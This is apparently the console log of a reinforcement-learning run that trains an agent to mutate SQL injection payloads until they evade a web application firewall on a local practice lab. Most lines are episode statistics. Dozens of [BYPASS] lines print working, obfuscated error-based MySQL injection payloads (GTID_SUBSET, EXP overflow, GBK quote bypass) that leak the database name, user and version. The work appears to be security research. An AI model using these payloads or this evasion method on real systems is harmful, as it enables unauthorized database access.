/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.65
  Ep 1150 | SR=0% | Steps=15.0 | R=-43.43
  Ep 1160 | SR=0% | Steps=15.0 | R=-42.64
  Ep 1170 | SR=0% | Steps=15.0 | R=-44.20
  [BYPASS] Ep 1177 | steps=11 | seq=url_encode -> case -> func_sp_nbsp -> func_sp_nl -> between_space -> backtick -> case -> unhex_wrap -> unhex_wrap -> vtab -> null_byte
           payload: 1'%0bAND%0bGTID_SUBSET((datAbAse%a0()),1);%00
  Ep 1180 | SR=10% | Steps=14.6 | R=-40.16
  [BYPASS] Ep 1188 | steps=11 | seq=func_sp_lit -> case -> null_byte -> unhex_wrap -> url_encode -> ver_12345 -> case -> url_mid_char -> null_byte -> unhex_wrap -> between_space
           payload: 1'%a0and%a0GTID_SUBSET((version%a0()),1);%00
  Ep 1190 | SR=10% | Steps=14.6 | R=-41.19
  Ep 1200 | SR=0% | Steps=15.0 | R=-43.12
  Ep 1210 | SR=0% | Steps=15.0 | R=-42.64
  Ep 1220 | SR=0% | Steps=15.0 | R=-40.93
  Ep 1230 | SR=0% | Steps=15.0 | R=-42.03
  Ep 1240 | SR=0% | Steps=15.0 | R=-42.66
  Ep 1250 | SR=0% | Steps=15.0 | R=-41.94
  Ep 1260 | SR=0% | Steps=15.0 | R=-42.54
  Ep 1270 | SR=0% | Steps=15.0 | R=-43.39
  Ep 1280 | SR=0% | Steps=15.0 | R=-43.04
  Ep 1290 | SR=0% | Steps=15.0 | R=-42.87
  Ep 1300 | SR=0% | Steps=15.0 | R=-43.40
  Ep 1310 | SR=0% | Steps=15.0 | R=-43.73
  Ep 1320 | SR=0% | Steps=15.0 | R=-42.59
  Ep 1330 | SR=0% | Steps=15.0 | R=-42.42
  Ep 1340 | SR=0% | Steps=15.0 | R=-42.40
  Ep 1350 | SR=0% | Steps=15.0 | R=-43.72
  Ep 1360 | SR=0% | Steps=15.0 | R=-42.85
  Ep 1370 | SR=0% | Steps=15.0 | R=-43.46
  Ep 1380 | SR=0% | Steps=15.0 | R=-42.75
  Ep 1390 | SR=0% | Steps=15.0 | R=-43.78
  Ep 1400 | SR=0% | Steps=15.0 | R=-43.84
  Ep 1410 | SR=0% | Steps=15.0 | R=-41.75
  Ep 1420 | SR=0% | Steps=15.0 | R=-43.09
  Ep 1430 | SR=0% | Steps=15.0 | R=-43.30
  Ep 1440 | SR=0% | Steps=15.0 | R=-43.53
  Ep 1450 | SR=0% | Steps=15.0 | R=-42.26
  Ep 1460 | SR=0% | Steps=15.0 | R=-44.09
  Ep 1470 | SR=0% | Steps=15.0 | R=-44.10
  Ep 1480 | SR=0% | Steps=15.0 | R=-44.47
  Ep 1490 | SR=0% | Steps=15.0 | R=-43.89
  Ep 1500 | SR=0% | Steps=15.0 | R=-43.44
  Ep 1510 | SR=0% | Steps=15.0 | R=-42.67
  Ep 1520 | SR=0% | Steps=15.0 | R=-43.40
  Ep 1530 | SR=0% | Steps=15.0 | R=-43.23
  Ep 1540 | SR=0% | Steps=15.0 | R=-42.48
  Ep 1550 | SR=0% | Steps=15.0 | R=-41.55
  Ep 1560 | SR=0% | Steps=15.0 | R=-41.25
  Ep 1570 | SR=0% | Steps=15.0 | R=-40.72
  Ep 1580 | SR=0% | Steps=15.0 | R=-41.45
  Ep 1590 | SR=0% | Steps=15.0 | R=-41.54
  Ep 1600 | SR=0% | Steps=15.0 | R=-41.59
  Ep 1610 | SR=0% | Steps=15.0 | R=-39.97
  Ep 1620 | SR=0% | Steps=15.0 | R=-39.96
  Ep 1630 | SR=0% | Steps=15.0 | R=-40.85
  [BYPASS] Ep 1634 | steps=12 | seq=case -> case -> hash_nl -> hex_to_char -> case -> case -> func_sp_lit -> between_space -> between_space -> url_mid_char -> case -> null_byte
           payload: 1'%a0ANd%a0EXP(~(SElect%a0*%a0FRoM%a0(SeleCT%a0(DATabase%a0()))a));%00
  Ep 1640 | SR=10% | Steps=14.7 | R=-38.03
  Ep 1650 | SR=0% | Steps=15.0 | R=-39.29
  Ep 1660 | SR=0% | Steps=15.0 | R=-38.32
  Ep 1670 | SR=0% | Steps=15.0 | R=-38.68
  Ep 1680 | SR=0% | Steps=15.0 | R=-38.57
  Ep 1690 | SR=0% | Steps=15.0 | R=-38.01
  Ep 1700 | SR=0% | Steps=15.0 | R=-38.54
  Ep 1710 | SR=0% | Steps=15.0 | R=-39.80
  Ep 1720 | SR=0% | Steps=15.0 | R=-39.84
  [BYPASS] Ep 1721 | steps=11 | seq=tab_space -> null_byte -> case -> null_byte -> case -> case -> case -> case -> case -> func_sp_lit -> between_space
           payload: 1'%09and%09EXP(~(SElECT%09*%09fRom%09(SElEcT%09(user%a0()))a));%00
  Ep 1730 | SR=10% | Steps=14.6 | R=-36.99
  Ep 1740 | SR=0% | Steps=15.0 | R=-38.28
  Ep 1750 | SR=0% | Steps=15.0 | R=-38.09
  Ep 1760 | SR=0% | Steps=15.0 | R=-38.89
  Ep 1770 | SR=0% | Steps=15.0 | R=-38.51
  Ep 1780 | SR=0% | Steps=15.0 | R=-39.22
  Ep 1790 | SR=0% | Steps=15.0 | R=-38.53
  Ep 1800 | SR=0% | Steps=15.0 | R=-39.44
  Ep 1810 | SR=0% | Steps=15.0 | R=-37.68
  Ep 1820 | SR=0% | Steps=15.0 | R=-38.12
  Ep 1830 | SR=0% | Steps=15.0 | R=-37.53
  Ep 1840 | SR=0% | Steps=15.0 | R=-38.20
  Ep 1850 | SR=0% | Steps=15.0 | R=-37.33
  Ep 1860 | SR=0% | Steps=15.0 | R=-38.43
  Ep 1870 | SR=0% | Steps=15.0 | R=-40.00
  Ep 1880 | SR=0% | Steps=15.0 | R=-38.97
  Ep 1890 | SR=0% | Steps=15.0 | R=-39.21
  Ep 1900 | SR=0% | Steps=15.0 | R=-38.64
  Ep 1910 | SR=0% | Steps=15.0 | R=-38.67
  [BYPASS] Ep 1915 | steps=11 | seq=case -> func_sp_nbsp -> crlf -> case -> case -> case -> case -> gbk_bypass -> case -> case -> null_byte
           payload: 1%bf%27%0d%0aANd%0d%0aGTID_SUBSET((DatabAse%a0()),1);%00
  Ep 1920 | SR=10% | Steps=14.6 | R=-35.49
  Ep 1930 | SR=0% | Steps=15.0 | R=-38.85
  Ep 1940 | SR=0% | Steps=15.0 | R=-37.15
  Ep 1950 | SR=0% | Steps=15.0 | R=-39.36
  Ep 1960 | SR=0% | Steps=15.0 | R=-38.79
  Ep 1970 | SR=0% | Steps=15.0 | R=-39.33
  Ep 1980 | SR=0% | Steps=15.0 | R=-38.80
  Ep 1990 | SR=0% | Steps=15.0 | R=-38.31
  Ep 2000 | SR=0% | Steps=15.0 | R=-39.93
  [BYPASS] Ep 2004 | steps=7 | seq=vtab -> case -> between_space -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0bAnd%0bGTID_SUBSET((user%a0()),1);%00
  Ep 2010 | SR=10% | Steps=14.2 | R=-33.89
  Ep 2020 | SR=0% | Steps=15.0 | R=-38.84
  Ep 2030 | SR=0% | Steps=15.0 | R=-37.87
  Ep 2040 | SR=0% | Steps=15.0 | R=-39.21
  Ep 2050 | SR=0% | Steps=15.0 | R=-39.77
  Ep 2060 | SR=0% | Steps=15.0 | R=-39.87
  Ep 2070 | SR=0% | Steps=15.0 | R=-38.42
  [BYPASS] Ep 2079 | steps=11 | seq=case -> case -> case -> case -> between_space -> null_byte -> case -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%a0anD%a0GTID_SUBSET((version%a0()),1);%00
  Ep 2080 | SR=10% | Steps=14.6 | R=-37.66
  Ep 2090 | SR=0% | Steps=15.0 | R=-39.51
  [BYPASS] Ep 2096 | steps=11 | seq=case -> paren_space -> case -> gbk_bypass -> between_space -> func_sp_nbsp -> case -> scientific -> case -> case -> null_byte
           payload: 1%bf%27%a0And%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2100 | SR=10% | Steps=14.6 | R=-34.86
  Ep 2110 | SR=0% | Steps=15.0 | R=-38.75
  Ep 2120 | SR=0% | Steps=15.0 | R=-38.01
  Ep 2130 | SR=0% | Steps=15.0 | R=-39.84
  Ep 2140 | SR=0% | Steps=15.0 | R=-39.26
  Ep 2150 | SR=0% | Steps=15.0 | R=-38.80
  Ep 2160 | SR=0% | Steps=15.0 | R=-38.10
  Ep 2170 | SR=0% | Steps=15.0 | R=-37.94
  Ep 2180 | SR=0% | Steps=15.0 | R=-39.13
  Ep 2190 | SR=0% | Steps=15.0 | R=-38.53
  [BYPASS] Ep 2200 | steps=15 | seq=func_sp_nbsp -> hash_nl -> case -> null_byte -> case -> case -> gbk_bypass -> case -> case -> case -> null_byte -> case -> case -> case -> tab_space
           payload: 1%bf%27%09ANd%09GTID_SUBSET((version%a0()),1);%00
  Ep 2200 | SR=10% | Steps=15.0 | R=-37.09
  Ep 2210 | SR=0% | Steps=15.0 | R=-38.55
  Ep 2220 | SR=0% | Steps=15.0 | R=-38.18
  [BYPASS] Ep 2225 | steps=9 | seq=between_space -> case -> null_byte -> null_byte -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0EXP(~(sEleCt%a0*%a0frOm%a0(selECT%a0(user%a0()))a));%00
  Ep 2230 | SR=10% | Steps=14.4 | R=-35.56
  Ep 2240 | SR=0% | Steps=15.0 | R=-37.97
  Ep 2250 | SR=0% | Steps=15.0 | R=-37.36
  Ep 2260 | SR=0% | Steps=15.0 | R=-37.18
  Ep 2270 | SR=0% | Steps=15.0 | R=-38.94
  Ep 2280 | SR=0% | Steps=15.0 | R=-39.62
  Ep 2290 | SR=0% | Steps=15.0 | R=-39.20
  [BYPASS] Ep 2291 | steps=7 | seq=between_space -> null_byte -> between_space -> case -> func_swap_err -> case -> func_sp_nbsp
           payload: 1'%a0And%a0EXP(~(selECt%a0*%a0fRom%a0(seLECt%a0(version%a0()))a));%00
  [BYPASS] Ep 2300 | steps=8 | seq=case -> null_byte -> between_space -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0AND%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2300 | SR=20% | Steps=13.5 | R=-32.08
  Ep 2310 | SR=0% | Steps=15.0 | R=-37.79
  Ep 2320 | SR=0% | Steps=15.0 | R=-38.13
  [BYPASS] Ep 2328 | steps=10 | seq=between_space -> func_sp_nbsp -> case -> between_space -> case -> case -> func_sp_nl -> case -> case -> null_byte
           payload: 1'%a0ANd%a0EXP(~(SELEct%a0*%a0From%a0(SeleCT%a0(version%a0()))a));%00
  Ep 2330 | SR=10% | Steps=14.5 | R=-36.32
  Ep 2340 | SR=0% | Steps=15.0 | R=-38.70
  [BYPASS] Ep 2346 | steps=10 | seq=between_space -> case -> case -> case -> crlf -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%a0And%a0EXP(~(seLeCt%a0*%a0FrOm%a0(selECt%a0(DAtabASe%a0()))a));%00
  Ep 2350 | SR=10% | Steps=14.5 | R=-34.99
  [BYPASS] Ep 2359 | steps=14 | seq=func_sp_nbsp -> case -> null_byte -> func_sp_nl -> func_sp_nl -> nested_or -> null_byte -> null_byte -> null_byte -> case -> case -> between_space -> func_sp_ff -> vtab
           payload: 1'%0baNd%0bGTID_SUBSET((datABaSE%a0()),1);%00
  Ep 2360 | SR=10% | Steps=14.9 | R=-38.26
  Ep 2370 | SR=0% | Steps=15.0 | R=-38.95
  Ep 2380 | SR=0% | Steps=15.0 | R=-37.94
  Ep 2390 | SR=0% | Steps=15.0 | R=-39.71
  Ep 2400 | SR=0% | Steps=15.0 | R=-38.08
  [BYPASS] Ep 2401 | steps=11 | seq=null_byte -> case -> between_space -> null_byte -> case -> case -> null_byte -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0aND%a0EXP(~(SElECt%a0*%a0frOM%a0(SElEcT%a0(user%a0()))a));%00
  Ep 2410 | SR=10% | Steps=14.6 | R=-36.85
  Ep 2420 | SR=0% | Steps=15.0 | R=-37.82
  Ep 2430 | SR=0% | Steps=15.0 | R=-38.16
  Ep 2440 | SR=0% | Steps=15.0 | R=-37.00
  Ep 2450 | SR=0% | Steps=15.0 | R=-38.97
  Ep 2460 | SR=0% | Steps=15.0 | R=-39.73
  Ep 2470 | SR=0% | Steps=15.0 | R=-38.47
  Ep 2480 | SR=0% | Steps=15.0 | R=-38.03
  Ep 2490 | SR=0% | Steps=15.0 | R=-38.17
  Ep 2500 | SR=0% | Steps=15.0 | R=-40.36
  Ep 2510 | SR=0% | Steps=15.0 | R=-39.16
  Ep 2520 | SR=0% | Steps=15.0 | R=-37.39
  Ep 2530 | SR=0% | Steps=15.0 | R=-37.29
  Ep 2540 | SR=0% | Steps=15.0 | R=-37.71
  Ep 2550 | SR=0% | Steps=15.0 | R=-37.16
  Ep 2560 | SR=0% | Steps=15.0 | R=-37.78
  Ep 2570 | SR=0% | Steps=15.0 | R=-38.22
  Ep 2580 | SR=0% | Steps=15.0 | R=-36.64
  Ep 2590 | SR=0% | Steps=15.0 | R=-37.64
  [BYPASS] Ep 2595 | steps=9 | seq=case -> case -> case -> null_byte -> case -> case -> case -> between_space -> func_sp_nbsp
           payload: 1'%a0and%a0GTID_SUBSET((version%a0()),1);%00
  Ep 2600 | SR=10% | Steps=14.4 | R=-34.69
  [BYPASS] Ep 2606 | steps=5 | seq=case -> null_byte -> case -> between_space -> func_sp_nbsp
           payload: 1'%a0AnD%a0EXP(~(seLEct%a0*%a0frOM%a0(seleCt%a0(version%a0()))a));%00  *** NEW SHORTEST ***
  Ep 2610 | SR=10% | Steps=14.0 | R=-33.47
  Ep 2620 | SR=0% | Steps=15.0 | R=-37.48
  Ep 2630 | SR=0% | Steps=15.0 | R=-38.04
  Ep 2640 | SR=0% | Steps=15.0 | R=-38.39
  [BYPASS] Ep 2648 | steps=15 | seq=between_space -> case -> case -> case -> null_byte -> case -> case -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0and%a0EXP(~(SelecT%a0*%a0fROM%a0(SElEct%a0(user%a0()))a));%00
  Ep 2650 | SR=10% | Steps=15.0 | R=-36.62
  Ep 2660 | SR=0% | Steps=15.0 | R=-38.19
  Ep 2670 | SR=0% | Steps=15.0 | R=-37.66
  [BYPASS] Ep 2677 | steps=8 | seq=case -> case -> case -> between_space -> case -> case -> func_sp_nbsp -> null_byte
           payload: 1'%a0anD%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2680 | SR=10% | Steps=14.3 | R=-34.73
  [BYPASS] Ep 2690 | steps=13 | seq=case -> case -> case -> between_space -> case -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> func_sp_tab -> case -> func_sp_nl -> null_byte
           payload: 1'%a0ANd%a0GTID_SUBSET((version%a0()),1);%00
  Ep 2690 | SR=10% | Steps=14.8 | R=-36.02
  Ep 2700 | SR=0% | Steps=15.0 | R=-37.12
  Ep 2710 | SR=0% | Steps=15.0 | R=-37.51
  Ep 2720 | SR=0% | Steps=15.0 | R=-37.52
  Ep 2730 | SR=0% | Steps=15.0 | R=-37.41
  [BYPASS] Ep 2737 | steps=13 | seq=between_space -> case -> func_sp_nbsp -> case -> case -> case -> case -> case -> case -> case -> case -> case -> null_byte
           payload: 1'%a0AND%a0EXP(~(sElECt%a0*%a0FRoM%a0(SELEcT%a0(DatAbAsE%a0()))a));%00
  Ep 2740 | SR=10% | Steps=14.8 | R=-36.26
  [BYPASS] Ep 2745 | steps=13 | seq=case -> case -> case -> case -> case -> between_space -> case -> case -> case -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%a0anD%a0EXP(~(sEleCT%a0*%a0From%a0(SElEct%a0(version%a0()))a));%00
  Ep 2750 | SR=10% | Steps=14.8 | R=-35.73
  Ep 2760 | SR=0% | Steps=15.0 | R=-37.14
  Ep 2770 | SR=0% | Steps=15.0 | R=-36.29
  Ep 2780 | SR=0% | Steps=15.0 | R=-37.09
  Ep 2790 | SR=0% | Steps=15.0 | R=-37.75
  Ep 2800 | SR=0% | Steps=15.0 | R=-37.49
  Ep 2810 | SR=0% | Steps=15.0 | R=-37.30
  Ep 2820 | SR=0% | Steps=15.0 | R=-38.09
  Ep 2830 | SR=0% | Steps=15.0 | R=-36.70
  Ep 2840 | SR=0% | Steps=15.0 | R=-37.51
  [BYPASS] Ep 2850 | steps=12 | seq=case -> case -> between_space -> convert_charset -> null_byte -> case -> case -> case -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2850 | SR=10% | Steps=14.7 | R=-34.45
  [BYPASS] Ep 2859 | steps=13 | seq=case -> case -> case -> between_space -> case -> case -> case -> case -> case -> func_sp_nbsp -> case -> case -> null_byte
           payload: 1'%a0AnD%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2860 | SR=10% | Steps=14.8 | R=-36.04
  Ep 2870 | SR=0% | Steps=15.0 | R=-37.25
  [BYPASS] Ep 2871 | steps=12 | seq=case -> null_byte -> between_space -> null_byte -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%a0AND%a0EXP(~(SElECt%a0*%a0From%a0(SelEct%a0(DatABaSE%a0()))a));%00
  Ep 2880 | SR=10% | Steps=14.7 | R=-35.94
  Ep 2890 | SR=0% | Steps=15.0 | R=-36.60
  Ep 2900 | SR=0% | Steps=15.0 | R=-37.95
  Ep 2910 | SR=0% | Steps=15.0 | R=-37.51
  Ep 2920 | SR=0% | Steps=15.0 | R=-37.51
  Ep 2930 | SR=0% | Steps=15.0 | R=-37.70
  Ep 2940 | SR=0% | Steps=15.0 | R=-36.61
  Ep 2950 | SR=0% | Steps=15.0 | R=-36.34
  [BYPASS] Ep 2958 | steps=9 | seq=case -> func_sp_lit -> case -> case -> case -> case -> between_space -> func_sp_ff -> null_byte
           payload: 1'%a0and%a0EXP(~(sElecT%a0*%a0FRom%a0(seLECt%a0(version%a0()))a));%00
  Ep 2960 | SR=10% | Steps=14.4 | R=-34.72
  Ep 2970 | SR=0% | Steps=15.0 | R=-37.47
  Ep 2980 | SR=0% | Steps=15.0 | R=-37.18
  Ep 2990 | SR=0% | Steps=15.0 | R=-37.38
  [BYPASS] Ep 2992 | steps=7 | seq=null_byte -> null_byte -> case -> between_space -> case -> case -> func_sp_nbsp
           payload: 1'%a0ANd%a0EXP(~(SElEcT%a0*%a0FROm%a0(SeLEcT%a0(version%a0()))a));%00
  Ep 3000 | SR=10% | Steps=14.2 | R=-34.65
  Ep 3010 | SR=0% | Steps=15.0 | R=-37.91
  Ep 3020 | SR=0% | Steps=15.0 | R=-37.22
  Ep 3030 | SR=0% | Steps=15.0 | R=-38.08
  Ep 3040 | SR=0% | Steps=15.0 | R=-37.95
  Ep 3050 | SR=0% | Steps=15.0 | R=-37.64
  Ep 3060 | SR=0% | Steps=15.0 | R=-36.96
